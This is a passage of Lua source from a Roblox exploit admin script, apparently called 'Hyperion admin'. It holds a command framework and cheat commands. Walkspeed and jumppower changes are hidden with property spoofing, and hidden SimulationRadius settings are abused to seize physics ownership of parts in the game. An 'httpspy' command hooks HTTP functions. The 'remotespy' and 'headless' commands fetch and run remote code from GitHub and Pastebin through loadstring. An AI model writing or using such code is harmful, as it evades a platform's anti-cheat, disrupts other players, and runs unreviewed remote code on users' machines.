		local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
			BackgroundTransparency = 0
		});

		CWait(Tween.Completed);
		Object.Visible = false

		local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
			Size = UDim2fromOffset(0, 0);
		});

		Utils.Tween(UICorner, "Quad", "Out", .25, {
			CornerRadius = UDim.new(1, 0)
		});

		CWait(Tween.Completed);
		Destroy(Frame);
	else
		Frame.Visible = true
		Frame.Size = UDim2fromOffset(0, 0)
		UICorner.CornerRadius = UDim.new(1, 0)

		local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
			Size = UDim2fromOffset(Object.AbsoluteSize.X, Object.AbsoluteSize.Y)
		});

		Utils.Tween(UICorner, "Quad", "Out", .25, {
			CornerRadius = CornerRadius
		});

		CWait(Tween.Completed);
		Object.Visible = true

		local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
			BackgroundTransparency = 1
		})

		CWait(Tween.Completed);
		Destroy(Frame);
	end
end

Utils.MakeGradient = function(ColorTable)
	local Table = {}
	local ColorSequenceKeypointNew = ColorSequenceKeypoint.new
	for Time, Color in next, ColorTable do
		Table[#Table + 1] = ColorSequenceKeypointNew(Time - 1, Color);
	end
	return ColorSequence.new(Table)
end

Utils.Debounce = function(Func)
	local Debounce = false

	return function(...)
		if (not Debounce) then
			Debounce = true
			Func(...);
			Debounce = false
		end
	end
end

Utils.ToggleFunction = function(Container, Enabled, Callback) -- fpr color picker
	local Switch = Container.Switch
	local Hitbox = Container.Hitbox
	local Color3fromRGB = Color3.fromRGB
	local UDim2fromOffset = UDim2.fromOffset

	Container.BackgroundColor3 = Color3fromRGB(255, 79, 87);

	if not Enabled then
		Switch.Position = UDim2fromOffset(2, 2)
		Container.BackgroundColor3 = Color3fromRGB(25, 25, 25);
	end

	AddConnection(CConnect(Hitbox.MouseButton1Click, function()
		Enabled = not Enabled

		Utils.Tween(Switch, "Quad", "Out", .25, {
			Position = Enabled and UDim2.new(1, -18, 0, 2) or UDim2fromOffset(2, 2)
		});
		Utils.Tween(Container, "Quad", "Out", .25, {
			BackgroundColor3 = Enabled and Color3fromRGB(255, 79, 87) or Color3fromRGB(25, 25, 25);
		});

		Callback(Enabled);
	end));
end

do
	local AmountPrint, AmountWarn, AmountError = 0, 0, 0;

	Utils.Warn = function(Text, Plr)
		local TimeOutputted = os.date("%X");
		local Clone = Clone(UI.MessageOut);

		Clone.Name = "W" .. tostring(AmountWarn + 1);
		Clone.Text = format("%s -- %s", TimeOutputted, Text);
		Clone.TextColor3 = Color3.fromRGB(255, 218, 68);
		Clone.Visible = true
		Clone.TextTransparency = 1
		Clone.Parent = Console.Frame.List

		Utils.Tween(Clone, "Sine", "Out", .25, {
			TextTransparency = 0
		})

		Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
		AmountWarn = AmountWarn + 1
		Utils.Notify(Plr, "Warning", Text);
	end

	Utils.Error = function(Text, Caller, FromNotif)
		local TimeOutputted = os.date("%X");
		local Clone = Clone(UI.MessageOut);

		Clone.Name = "E" .. tostring(AmountError + 1);
		Clone.Text = format("%s -- %s", TimeOutputted, Text);
		Clone.TextColor3 = Color3.fromRGB(215, 90, 74);
		Clone.Visible = true
		Clone.TextTransparency = 1
		Clone.Parent = Console.Frame.List

		Utils.Tween(Clone, "Sine", "Out", .25, {
			TextTransparency = 0
		})

		Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
		AmountError = AmountError + 1
	end

	Utils.Print = function(Text, Caller, FromNotif)
		local TimeOutputted = os.date("%X");
		local Clone = Clone(UI.MessageOut);

		Clone.Name = "P" .. tostring(AmountPrint + 1);
		Clone.Text = format("%s -- %s", TimeOutputted, Text);
		Clone.Visible = true
		Clone.TextTransparency = 1
		Clone.Parent = Console.Frame.List

		Utils.Tween(Clone, "Sine", "Out", .25, {
			TextTransparency = 0
		})

		Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
		AmountPrint = AmountPrint + 1
		if (len(Text) <= 35 and not FromNotif) then
			Utils.Notify(Caller, "Output", Text);
		end
	end
end
--END IMPORT [utils]



-- commands table
local CommandsTable = {}
local RespawnTimes = {}

local HasTool = function(plr)
	plr = plr or LocalPlayer
	local CharChildren, BackpackChildren = GetChildren(GetCharacter(plr)), GetChildren(plr.Backpack);
	local ToolFound = false
	local tbl = tbl_concat(CharChildren, BackpackChildren);
	for i = 1, #tbl do
		local v = tbl[i]
		if (IsA(v, "Tool")) then
			ToolFound = true
			break;
		end
	end
	return ToolFound
end

local isR6 = function(plr)
	plr = plr or LocalPlayer
	local Humanoid = GetHumanoid(plr);
	if (Humanoid) then
		return Humanoid.RigType == Enum.HumanoidRigType.R6
	end
	return false
end

local isR15 = function(plr)
	plr = plr or LocalPlayer
	local Humanoid = GetHumanoid(plr);
	if (Humanoid) then
		return Humanoid.RigType == Enum.HumanoidRigType.R15
	end
	return false
end

local isSat = function(plr)
	plr = plr or LocalPlayer
	local Humanoid = GetHumanoid(plr)
	if (Humanoid) then
		return Humanoid.Sit
	end
end

local DisableAnimate = function()
	local Animate = GetCharacter().Animate
	Animate = IsA(Animate, "LocalScript") and Animate or nil
	if (Animate) then
		SpoofProperty(Animate, "Disabled");
		Animate.Disabled = true
	end
end

local GetCorrectToolWithHandle = function()
	local Tools = filter(tbl_concat(GetChildren(LocalPlayer.Backpack), GetChildren(LocalPlayer.Character)), function(i, Tool)
		local Correct = IsA(Tool, "Tool");
		if (Correct and (Tool.RequiresHandle or FindFirstChild(Tool, "Handle"))) then
			local Descendants = GetDescendants(Tool);
			for i = 1, #Descendants do
				local Descendant = Descendants[i]
				if (IsA(Descendant, "Sound") or IsA(Descendant, "Camera") or IsA(Descendant, "LocalScript")) then
					Destroy(Descendant);
				end
			end
			return true
		end
		return false
	end)

	return Tools[1]
end

local CommandRequirements = {
	[1] = {
		Func = HasTool,
		Message = "You need a tool for this command."
	},
	[2] = {
		Func = isR6,
		Message = "This command doesn't work on R15."
	},
	[3] = {
		Func = function()
			return GetCharacter() ~= nil
		end,
		Message = "You need to be spawned for this command."
	},
	[4] = {
		Func = isR15,
		Message = "This command doesn't work on R6."
	},
}

local AddCommand = function(name, aliases, description, options, func, isplugin)
	local Cmd = {
		Name = name,
		Aliases = aliases,
		Description = description,
		Options = options,
		Function = function()
			for i, v in next, options do
				if (type(v) == 'function' and v() == false) then
					Utils.Warn("You are missing something that is needed for this command", LocalPlayer);
					return nil
				elseif (type(v) == 'number' and CommandRequirements[v].Func() == false) then
					Utils.Warn(CommandRequirements[v].Message, LocalPlayer);
					return nil
				end
			end
			return func
		end,
		ArgsNeeded = tonumber(filter(options, function(i,v)
			return type(v) == "string"
		end)[1]) or 0,
		Args = filter(options, function(i, v)
			return type(v) == "table"
		end)[1] or {},
		CmdEnv = {},
		IsPlugin = isplugin == true
	}

	CommandsTable[name] = Cmd
	if (type(aliases) == 'table') then
		for i, v in next, aliases do
			CommandsTable[v] = Cmd
		end
	end
	return Success
end

local RemoveCommand = function(Name)
	local Command = LoadCommand(Name);
	if (Command) then
		CommandsTable[Name] = nil
		local CommandsList = Commands.Frame.List
		local CommandLabel = FindFirstChild(CommandsList, Name);
		if (CommandLabel) then
			Destroy(CommandLabel);
		end
		return true
	end
	return false
end

local LoadCommand = function(Name)
	return rawget(CommandsTable, Name);
end

local PluginConf;
local ExecuteCommand = function(Name, Args, Caller)
	local Command = LoadCommand(Name);
	if (Command) then
		if (Command.ArgsNeeded > #Args) then
			return Utils.Warn(format("Insuficient Args (you need %d)", Command.ArgsNeeded), LocalPlayer);
		end

		local Context;
		local sett, gett = syn and syn_context_set or setidentity, syn and syn_context_get or getidentity
		if (Command.IsPlugin and sett and gett and PluginConf.SafePlugins) then
			Context = gett();
			sett(2);
		end
		local Success, Ret = xpcall(function()
			local Func = Command.Function();
			if (Func) then
				local Executed = Func(Caller, Args, Command.CmdEnv);
				if (Executed) then
					Utils.Notify(Caller, "Command", Executed);
				end
				if (Command.Name ~= "lastcommand") then
					if (#LastCommand == 3) then
						LastCommand = shift(LastCommand);
					end
					LastCommand[#LastCommand + 1] = {Command.Name, Args, Caller, Command.CmdEnv}
				end
			end
			Success = true
		end, function(Err)
			if (Debug) then
				Utils.Error(format("[FA CMD Error]: Command = '%s' Traceback = '%s'", Name, debug.traceback(Err)), Caller);
				Utils.Notify(Caller, "Error", format("Error detected in the '%s' command!", Name));
			end
		end);
		if (Command.IsPlugin and sett and PluginConf.SafePlugins and Context) then
			sett(Context);
		end
	else
		Utils.Warn("Couldn't find the command " .. Name, Caller);
	end
end

local ReplaceHumanoid = function(Hum, R)
	local Humanoid = Hum or GetHumanoid();
	local NewHumanoid = Clone(Humanoid);
	if (R) then
		NewHumanoid.Name = "1"
	end
	NewHumanoid.Parent = Humanoid.Parent
	NewHumanoid.Name = Humanoid.Name
	Services.Workspace.Camera.CameraSubject = NewHumanoid
	Destroy(Humanoid);
	SpoofInstance(NewHumanoid);
	return NewHumanoid
end

local ReplaceCharacter = function()
	local Char = LocalPlayer.Character
	local Model = InstanceNew("Model");
	LocalPlayer.Character = Model
	LocalPlayer.Character = Char
	Destroy(Model);
	return Char
end

local CFrameTool = function(tool, pos)
	local RightArm = FindFirstChild(GetCharacter(), "RightLowerArm") or FindFirstChild(GetCharacter(), "Right Arm");
	local Arm = RightArm.CFrame * CFrameNew(0, -1, 0, 1, 0, 0, 0, 0, 1, 0, -1, 0);
	local Frame = Inverse(toObjectSpace(Arm, pos));

	tool.Grip = Frame
end

local Sanitize = function(value)
	if typeof(value) == 'CFrame' then
		local components = {components(value)}
		for i,v in pairs(components) do
			components[i] = floor(v * 10000 + .5) / 10000
		end
		return 'CFrame.new('..concat(components, ', ')..')'
	end
end

local AddPlayerConnection = function(Player, Connection, CEnv)
	if (CEnv) then
		CEnv[#CEnv + 1] = Connection
	else
		Connections.Players[Player.Name].Connections[#Connections.Players[Player.Name].Connections + 1] = Connection
	end
	return Connection
end


local DisableAllCmdConnections = function(Cmd)
	local Command = LoadCommand(Cmd)
	if (Command and Command.CmdEnv) then
		for i, v in next, flat(Command.CmdEnv) do
			if (type(v) == 'userdata' and v.Disconnect) then
				Disconnect(v);
			end
		end
	end
	return Command
end

local Keys = {}

do
	local UserInputService = Services.UserInputService
	local IsKeyDown = UserInputService.IsKeyDown
	local WindowFocused = true
	AddConnection(CConnect(UserInputService.WindowFocusReleased, function()
		WindowFocused = false
	end));
	AddConnection(CConnect(UserInputService.WindowFocused, function()
		WindowFocused = true
	end));
	local GetFocusedTextBox = UserInputService.GetFocusedTextBox
	AddConnection(CConnect(UserInputService.InputBegan, function(Input, GameProcessed)
		Keys["GameProcessed"] = GameProcessed and WindowFocused and not (not GetFocusedTextBox(UserInputService));
		Keys["LastEntered"] = Input.KeyCode
		if (GameProcessed) then return end
		local KeyCode = split(tostring(Input.KeyCode), ".")[3]
		Keys[KeyCode] = true
		for i = 1, #Macros do
			local Macro = Macros[i]
			if (Tfind(Macro.Keys, Input.KeyCode)) then
				if (#Macro.Keys == 2) then
					if (IsKeyDown(UserInputService, Macro.Keys[1]) and IsKeyDown(UserInputService, Macro.Keys[2]) --[[and Macro.Keys[1] == Input.KeyCode]]) then
						ExecuteCommand(Macro.Command, Macro.Args);
					end
				else
					ExecuteCommand(Macro.Command, Macro.Args);
				end
			end
		end

		if (Input.KeyCode == Enum.KeyCode.F8) then
			if (Console.Visible) then
				local Tween = Utils.TweenAllTrans(Console, .25)
				CWait(Tween.Completed);
				Console.Visible = false
			else
				local MessageClone = Clone(Console.Frame.List);

				Utils.ClearAllObjects(Console.Frame.List)
				Console.Visible = true

				local Tween = Utils.TweenAllTransToObject(Console, .25, ConsoleTransparencyClone)

				Destroy(Console.Frame.List)
				MessageClone.Parent = Console.Frame

				for i, v in next, GetChildren(Console.Frame.List) do
					if (not IsA(v, "UIListLayout")) then
						Utils.Tween(v, "Sine", "Out", .25, {
							TextTransparency = 0
						})
					end
				end

				local ConsoleListLayout = Console.Frame.List.UIListLayout

				CConnect(GetPropertyChangedSignal(ConsoleListLayout, "AbsoluteContentSize"), function()
					local CanvasPosition = Console.Frame.List.CanvasPosition
					local CanvasSize = Console.Frame.List.CanvasSize
					local AbsoluteSize = Console.Frame.List.AbsoluteSize

					if (CanvasSize.Y.Offset - AbsoluteSize.Y - CanvasPosition.Y < 20) then
						wait();
						Console.Frame.List.CanvasPosition = Vector2.new(0, CanvasSize.Y.Offset + 1000);
					end
				end)

				Utils.Tween(Console.Frame.List, "Sine", "Out", .25, {
					ScrollBarImageTransparency = 0
				})
			end
		end
	end));
	AddConnection(CConnect(UserInputService.InputEnded, function(Input, GameProcessed)
		if (GameProcessed) then return end
		local KeyCode = split(tostring(Input.KeyCode), ".")[3]
		if (Keys[KeyCode] or Keys[Input.KeyCode]) then
			Keys[KeyCode] = false
		end
	end));
end

AddCommand("commandcount", {"cc"}, "shows you how many commands there is in Hyperion admin", {}, function(Caller)
	Utils.Notify(Caller, "Amount of Commands", format("There are currently %s commands.", #filter(CommandsTable, function(i,v)
		return indexOf(CommandsTable, v) == i
	end)))
end)

AddCommand("walkspeed", {"ws", "speed"}, "changes your walkspeed to the second argument", {}, function(Caller, Args, CEnv)
	local Humanoid = GetHumanoid();
	CEnv[1] = Humanoid.WalkSpeed
	SpoofProperty(Humanoid, "WalkSpeed");
	Humanoid.WalkSpeed = tonumber(Args[1]) or 16
	Utils.Notify(Caller, "Walkspeed", "Walkspeed set to " .. Humanoid.WalkSpeed)		
end)

AddCommand("jumppower", {"jp"}, "changes your jumpower to the second argument", {}, function(Caller, Args, CEnv)
	local Humanoid = GetHumanoid();
	CEnv[1] = Humanoid.JumpPower
	SpoofProperty(Humanoid, "JumpPower");
	SpoofProperty(Humanoid, "UseJumpPower");
	Humanoid.UseJumpPower = true
	Humanoid.JumpPower = tonumber(Args[1]) or 50
	Utils.Notify(Caller, "Jumppower", "Jumppower set to " .. Humanoid.JumpPower)	
end)

AddCommand("hipheight", {"hh"}, "changes your hipheight to the second argument", {}, function(Caller, Args, CEnv)
	local Humanoid = GetHumanoid();
	CEnv[1] = Humanoid.HipHeight
	SpoofProperty(Humanoid, "HipHeight");
	Humanoid.HipHeight = tonumber(Args[1]) or 0	
	Utils.Notify(Caller, "Hipheight", "Hipheight set to " .. Humanoid.HipHeight)
end)


AddCommand("remotespy", {"rspy"}, "spy remotes in game", {}, function()
	loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
end)

AddCommand("httpspy", {}, "httpspy game", {}, function()
	local MessageClone = Clone(HttpLogs.Frame.List);

	Utils.ClearAllObjects(HttpLogs.Frame.List)
	HttpLogs.Visible = true

	local Tween = Utils.TweenAllTransToObject(HttpLogs, .25, HttpLogsTransparencyClone)

	Destroy(HttpLogs.Frame.List)
	MessageClone.Parent = HttpLogs.Frame

	for i, v in next, GetChildren(HttpLogs.Frame.List) do
		if (not IsA(v, "UIListLayout")) then
			Utils.Tween(v, "Sine", "Out", .25, {
				TextTransparency = 0
			})
		end
	end

	local HttpLogsListLayout = HttpLogs.Frame.List.UIListLayout

	CConnect( GetPropertyChangedSignal(HttpLogsListLayout, "AbsoluteContentSize"), function()
		local CanvasPosition = HttpLogs.Frame.List.CanvasPosition
		local CanvasSize = HttpLogs.Frame.List.CanvasSize
		local AbsoluteSize = HttpLogs.Frame.List.AbsoluteSize

		if (CanvasSize.Y.Offset - AbsoluteSize.Y - CanvasPosition.Y < 20) then
			wait() -- chatlogs updates absolutecontentsize before sizing frame
			HttpLogs.Frame.List.CanvasPosition = Vector2.new(0, CanvasSize.Y.Offset + 1000) --ChatLogsListLayout.AbsoluteContentSize.Y + 100)
		end
	end)

	Utils.Tween(HttpLogs.Frame.List, "Sine", "Out", .25, {
		ScrollBarImageTransparency = 0
	})

	local AddLog = function(reqType, url, Req)
		if (getgenv().F_A and UI) then
			local Clone = Clone(ChatLogMessage);
			Clone.Text = format("%s\nUrl: %s%s\n", Utils.TextFont(reqType .. " Detected (time: " .. tostring(os.date("%X")) ..")", {255, 165, 0}), url, Req and ", RequestPayLoad: " .. Utils.TextFont(Req, {255, 255, 0}) or "");
			Clone.RichText = true
			Clone.Visible = true
			Clone.TextTransparency = 1
			Clone.Parent = HttpLogs.Frame.List
			Utils.Tween(Clone, "Sine", "Out", .25, {
				TextTransparency = 0
			});
			HttpLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, HttpLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y);
		end
	end

	local Request;
	Request = hookfunction(syn and syn.request or request, newcclosure(function(reqtbl)
		AddLog(syn and "syn.request" or "request", reqtbl.Url, JSONEncode(Services.HttpService, reqtbl));
		return Request(reqtbl);
	end));
	local Httpget;
	Httpget = hookfunction(game.HttpGet, newcclosure(function(self, url)
		AddLog("HttpGet", url);
		return Httpget(self, url);
	end));
	if (game.HttpGet ~= game.HttpGetAsync) then
		local HttpgetAsync;
		HttpgetAsync = hookfunction(game.HttpGetAsync, newcclosure(function(self, url)
			AddLog("HttpGetAsync", url);
			return HttpgetAsync(self, url);
		end));
	end
	local Httppost;
	Httppost = hookfunction(game.HttpPost, newcclosure(function(self, url)
		AddLog("HttpPost", url);
		return Httppost(self, url);
	end));
	if (game.HttpPost ~= game.HttpPostAsync) then
		local HttppostAsync;
		HttppostAsync = hookfunction(game.HttpPostAsync, newcclosure(function(self, url)
			AddLog("HttpPostAsync", url);
			return HttppostAsync(self, url);
		end));
	end

	local Clone = Clone(ChatLogMessage);
	Clone.Text = "Httpspy loaded."
	Clone.RichText = true
	Clone.Visible = true
	Clone.TextTransparency = 1
	Clone.Parent = HttpLogs.Frame.List
	Utils.Tween(Clone, "Sine", "Out", .25, {
		TextTransparency = 0
	});
	HttpLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, HttpLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y);
end)

AddCommand("netless", {}, "gives you network of character", {}, function()
	while true do
		wait(1)
		for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
			if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
				game:GetService("RunService").Heartbeat:connect(function()
					v.Velocity = Vector3.new(-30,0,0)
				end)
			end
		end
	end
end)

AddCommand("part", {}, "spawns a part (client side)", {}, function()
	local spawnPosition = game:FindFirstChildOfClass("Players").LocalPlayer.Character.Head.CFrame.p + Vector3.new(0,5,0) -- Change the values to the desired position

	local part = Instance.new("Part")
	part.Size = Vector3.new(5, 1, 2)  
	part.BrickColor = BrickColor.new("Grey")  
	part.Position = spawnPosition
	part.Parent = workspace
	part.Anchored = false
end)

AddCommand("ownership", {}, "gives you ownership of unanchored parts", {}, function()
	Utils.Notify(Caller, "Partownership", "Enabled!")	

	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local LocalPlayer = Players.LocalPlayer

	if not getgenv().Network then
		getgenv().Network = {
			BaseParts = {};
			FakeConnections = {};
			Connections = {};
			Output = {
				Enabled = true;
				Prefix = "[NETWORK] ";
				Send = function(Type,Output,BypassOutput)
					if typeof(Type) == "function" and (Type == print or Type == warn or Type == error) and typeof(Output) == "string" and (typeof(BypassOutput) == "nil" or typeof(BypassOutput) == "boolean") then
						if Network["Output"].Enabled or BypassOutput then
							Type(Network["Output"].Prefix..Output);
						end;
					elseif Network["Output"].Enabled then
						error(Network["Output"].Prefix.."Output Send Error : Invalid syntax.");
					end;
				end;
			};
			LostParts = {};
			CharacterRelative = true;
			LastCharacter = nil;
			TryKeep = true; --loop attempts to
			PartOwnership = {
				PreMethodSettings = {};
				Enabled = false;
			};
		}

		Network["Output"].Send(print,": Loading.")

		Network["RetainPart"] = function(Part,Silent,ReturnFakePart) --function for retaining ownership of unanchored parts
			assert(Network["PartOwnership"]["Enabled"], Network["Output"].Prefix.." RetainPart Error : PartOwnership is Disabled.")
			assert(typeof(Part) == "Instance" and Part:IsA("BasePart") and not Part:IsGrounded(),Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg1 (Part) must be an ungrounded BasePart which is a descendant of workspace.")
			if not Part:IsDescendantOf(workspace) then
				Network["Output"].Send(error,"RetainPart Error : Invalid syntax: Arg1 (Part) must be an ungrounded BasePart which is a descendant of workspace.")
				local Index = table.find(Network["LostParts"],Part)
				if Index then
					table.remove(Network["LostParts"],Index)
				end
				return false
			end
			assert(typeof(Silent) == "boolean" or typeof(Silent) == "nil",Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg2 (Silent) must be a boolean or nil.")
			assert(typeof(ReturnFakePart) == "boolean" or typeof(ReturnFakePart) == "nil",Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg3 (ReturnFakePart) must be a boolean or nil.")
			if not table.find(Network["BaseParts"],Part) and not table.find(Network["LostParts"],Part) then
				table.insert(Network["BaseParts"],Part)
				Part.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
				if not Silent then
					Network["Output"].Send(print,"PartOwnership Output : PartOwnership applied to BasePart "..Part:GetFullName()..".")
				end
				if ReturnFakePart then
					local workspaceParts = {}
					return FakePart
				end
			else
				Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it already active.")
				return false
			end
		end

		Network["RemovePart"] = function(Part,Silent) --function for removing ownership of unanchored part
			assert(typeof(Part) == "Instance" and Part:IsA("BasePart"),Network["Output"].Prefix.."RemovePart Error : Invalid syntax: Arg1 (Part) must be a BasePart.")
			local Index1 = table.find(Network["BaseParts"],Part)
			local Index2 = table.find(Network["LostParts"],Part)
			if Index1 then
				table.remove(Network["BaseParts"],Index1)
			else
				if not Silent then
					Network["Output"].Send(warn,"RemovePart Warning : BasePart "..Part:GetFullName().." not found in BaseParts table.")
				end
				return
			end
			if Index2 then
				table.remove(Network["LostParts"],Index2)
			end
			if not Silent then
				Network["Output"].Send(print,"RemovePart Output: PartOwnership removed from BasePart "..Part:GetFullName()..".")
			end
		end

		Network["PartOwnership"]["PartCoroutine"] = coroutine.create(function(Part)
			if Part:IsDescendantOf(workspace) then
				if Network.CharacterRelative then
					local Character = Network["LastCharacter"];
					if not Character.PrimaryPart then
						for _,Inst in pairs(Character:GetDescendants()) do
							if Inst:IsA("BasePart") then
								Character.PrimaryPart = Inst
								break
							end
						end
					end
					if Character and Character.PrimaryPart then
						local Distance = (Character.PrimaryPart.Position - Part.Position).Magnitude
						if Distance > gethiddenproperty(LocalPlayer,"MaximumSimulationRadius") and not isnetworkowner(Part) then
							Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is more than "..gethiddenproperty(LocalPlayer,"MaximumSimulationRadius").." studs away.")
							Network["RemovePart"](Part)
							if not Part:IsGrounded() then
								table.insert(Network["LostParts"],Part)
							else
								Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is grounded.")
							end
						end
					else
						Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as the LocalPlayer Character's PrimaryPart does not exist.")
					end
				end
				Part.AssemblyLinearVelocity = (Part.AssemblyLinearVelocity.Unit+Vector3.new(.01,.01,.01))*(50+math.cos(tick()*10))
			else
				Network["RemovePart"](Part)
			end
		end)

		Network["PartOwnership"]["Enable"] = coroutine.create(function() --creating a thread for network stuff
			if not Network["PartOwnership"]["Enabled"] then
				Network["PartOwnership"]["Enabled"] = true
				Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus = LocalPlayer.ReplicationFocus
				LocalPlayer.ReplicationFocus = workspace
				Network["PartOwnership"]["PreMethodSettings"].SimulationRadius = gethiddenproperty(LocalPlayer,"SimulationRadius")
				Network["PartOwnership"]["Connection"] = RunService.Stepped:Connect(function()
					Network["LastCharacter"] = pcall(function() return LocalPlayer.Character end) or Network["LastCharacter"]
					sethiddenproperty(LocalPlayer,"SimulationRadius",1/0)
					coroutine.wrap(function()
						for _,Part in pairs(Network["BaseParts"]) do --loop through parts and do network stuff
							coroutine.resume(Network["PartOwnership"]["PartCoroutine"],Part)
							--[==[ [[by 4eyes btw]] ]==]--
						end
					end)()
					coroutine.wrap(function()
						for _,Part in pairs(Network["LostParts"]) do
							Network.RetainPart(Part,true)
						end
					end)()
				end)
				Network["Output"].Send(print,"PartOwnership Output : PartOwnership enabled.")
			else
				Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already enabled.")
			end
		end)

		Network["PartOwnership"]["Disable"] = coroutine.create(function()
			if Network["PartOwnership"]["Connection"] then
				Network["PartOwnership"]["Connection"]:Disconnect()
				LocalPlayer.ReplicationFocus = Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus
				sethiddenproperty(LocalPlayer,"SimulationRadius",Network["PartOwnership"]["PreMethodSettings"].SimulationRadius)
				Network["PartOwnership"]["PreMethodSettings"] = {}
				for _,Part in pairs(Network["BaseParts"]) do
					Network["RemovePart"](Part)
				end
				for Index,Part in pairs(Network["LostParts"]) do
					table.remove(Network["LostParts"],Index)
				end
				Network["PartOwnership"]["Enabled"] = false
				Network["Output"].Send(print,"PartOwnership Output : PartOwnership disabled.")
			else
				Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already disabled.")
			end
		end)

		Network["Output"].Send(print,": Loaded.")
	end
	coroutine.resume(Network["PartOwnership"]["Enable"])

	for i,v in pairs(LocalPlayer.Character:GetDescendants()) do
		if v:IsA("Accessory") then
			Network.RetainPart(v.Handle)
		end
	end
end)

AddCommand("partgravity", {}, "unanchored parts zero gravity", {}, function()
	spawn(function()
		while true do
			game.Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)*math.huge
			game.Players.LocalPlayer.SimulationRadius = math.pow(math.huge,math.huge)*math.huge
			game:GetService("RunService").Stepped:wait()
		end
	end)
	local function zeroGrav(part)
		if part:FindFirstChild("BodyForce") then return end
		local temp = Instance.new("BodyForce")
		temp.Force = part:GetMass() * Vector3.new(0,workspace.Gravity,0)
		temp.Parent = part
	end

	for i,v in ipairs(workspace:GetDescendants()) do
		if v:IsA("Part") and v.Anchored == false then
			if not (v:IsDescendantOf(game.Players.LocalPlayer.Character)) then
				zeroGrav(v)
			end
		end
	end

	workspace.DescendantAdded:Connect(function(part)
		if part:IsA("Part") and part.Anchored == false then
			if not (part:IsDescendantOf(game.Players.LocalPlayer.Character)) then
				zeroGrav(part)
			end
		end
	end)
	Utils.Notify(Caller, "Partgravity", "Enabled!")	
end)

AddCommand("headless", {}, "removes your head", {2}, function()
	loadstring(game:HttpGet("https://pastebin.com/raw/yc0STZCK"))()
	Utils.Notify(Caller, "Headless", "Loading...")
end)

AddCommand("r6", {}, "changes your humanoidrigtype to R6 if possible", {}, function()
	local AvatarEditorService = game:GetService("AvatarEditorService")
	local Players = game:GetService("Players")

	local player = Players.LocalPlayer
	local character = player.Character
	if not character or not character.Parent then
		character = player.CharacterAdded:Wait()
	end
	local humanoid = character:WaitForChild("Humanoid")

	local currentDescription = humanoid:GetAppliedDescription()
	AvatarEditorService:PromptSaveAvatar(currentDescription, Enum.HumanoidRigType.R6)

	local result = AvatarEditorService.PromptSaveAvatarCompleted:Wait()
	if result == Enum.AvatarPromptResult.Success then
	end
	Utils.Notify(Caller, "AvatarEditorService", "R6 loading...")
	local BaseParts = filter(GetChildren(GetCharacter(v)), function(i, v)
		return IsA(v, "BasePart");
	end)
	for i, v in next, BaseParts do
		SpoofProperty(v, "Anchored");
		v.Anchored = true
	end
	player.Character:BreakJoints()
	wait(Players.RespawnTime - 0.03);
	local OldPos = GetRoot().CFrame
	CWait(LocalPlayer.CharacterAdded)
	WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
end)

AddCommand("r15", {}, "changes your humanoidrigtype to R15 if possible", {}, function()
	local AvatarEditorService = game:GetService("AvatarEditorService")
	local Players = game:GetService("Players")

	local player = Players.LocalPlayer
	local character = player.Character
	if not character or not character.Parent then
		character = player.CharacterAdded:Wait()
	end
	local humanoid = character:WaitForChild("Humanoid")

	local currentDescription = humanoid:GetAppliedDescription()
	AvatarEditorService:PromptSaveAvatar(currentDescription, Enum.HumanoidRigType.R15)

	local result = AvatarEditorService.PromptSaveAvatarCompleted:Wait()
	if result == Enum.AvatarPromptResult.Success then
	end
	Utils.Notify(Caller, "AvatarEditorService", "R15 loading...")
	local BaseParts = filter(GetChildren(GetCharacter(v)), function(i, v)
		return IsA(v, "BasePart");
	end)
	for i, v in next, BaseParts do
		SpoofProperty(v, "Anchored");
		v.Anchored = true
	end
	player.Character:BreakJoints()
	wait(Players.RespawnTime - 0.03);
	local OldPos = GetRoot().CFrame
	CWait(LocalPlayer.CharacterAdded)
	WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
end)

AddCommand("simulater6", {}, "simulates r6 animations", {4}, function()

local plr = game:GetService("Players").LocalPlayer

function RunCustomAnimation(Char)
	if Char:WaitForChild("Animate") ~= nil then
		Char.Animate.Disabled = true
	end
	
	Char:WaitForChild("Humanoid")

	for i,v in next, Char.Humanoid:GetPlayingAnimationTracks() do
		v:Stop()
	end

	--fake script
	local script = Char.Animate

	local Character = Char
	local Humanoid = Character:WaitForChild("Humanoid")
	local pose = "Standing"

	local UserGameSettings = UserSettings():GetService("UserGameSettings")

	local userNoUpdateOnLoopSuccess, userNoUpdateOnLoopValue = pcall(function() return UserSettings():IsUserFeatureEnabled("UserNoUpdateOnLoop") end)
	local userNoUpdateOnLoop = userNoUpdateOnLoopSuccess and userNoUpdateOnLoopValue

